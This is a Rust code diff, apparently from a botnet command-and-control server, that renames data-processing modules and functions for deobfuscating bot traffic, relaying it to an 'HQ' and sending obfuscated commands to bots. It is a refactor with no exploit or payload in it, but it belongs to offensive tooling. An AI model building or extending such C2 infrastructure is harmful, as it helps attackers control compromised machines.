@@ -30,7 +30,7 @@ use rmp_serde::{Deserializer, Serializer};
 use base32;
 
 use crate::{
-    morse,
+    encoder,
     communication::bot::{Bot, Device_stream},
     communication::lib,
     encryption as enc,
@@ -81,8 +81,8 @@ async fn authenticate_new_user(socket: &tokio::net::TcpStream, addr: SocketAddr)
     );
     let data = handle_message_received(&mut DS, socket).await;
     if DS.connected {
-        let encryption_key = msg::data_processing::deobfuscate_data(data, false, &DS.encryption_key);
-        DS.B = msg::data_processing::deserialize_message(encryption_key);
+        let encryption_key = msg::c2_bot_data_processing::deobfuscate_data(data, false, &DS.encryption_key);
+        DS.B = msg::c2_bot_data_processing::deserialize_rmp(encryption_key);
         DS.encryption_key = DS.B.com.data.clone();
     }
     return DS;
@@ -105,8 +105,8 @@ async fn handle_message_from_client(
                 DS.connected = false;
             },
             Ok(recv_bytes) => { // edode : Deobfuscating data and sending it to the HQ
-                let marshaled_data = msg::data_processing::deobfuscate_data(buffer.to_vec(), true, &DS.encryption_key);
-                DS.B = msg::data_processing::deserialize_message(marshaled_data);
+                let marshaled_data = msg::c2_bot_data_processing::deobfuscate_data(buffer.to_vec(), true, &DS.encryption_key);
+                DS.B = msg::c2_bot_data_processing::deserialize_rmp(marshaled_data);
                 bot_tx.send(DS.clone()).unwrap();
                 buffer
                     .iter_mut()
@@ -124,7 +124,7 @@ async fn handle_message_from_client(
         match c2_rx.try_recv() {
             Ok(DS) => {
                 println!("Sending commands to bots");
-                let obfuscated_data = msg::data_processing::obfuscate_data(msg::data_processing::serialize_data(&DS.B), &DS.encryption_key);
+                let obfuscated_data = msg::c2_bot_data_processing::obfuscate_data(msg::c2_bot_data_processing::serialize_rmp(&DS.B), &DS.encryption_key);
                 socket.write(obfuscated_data.as_slice()).await?;
             },
             _ => {}
@@ -150,6 +150,7 @@ async fn client_input (
     }
 }
 
+/// Receiving the data from the bot and sending it to the HQ
 async fn receive_bot_data(
     mut bot_rx: Receiver<bot::Device_stream>,
     //hq_tx: TcpStream
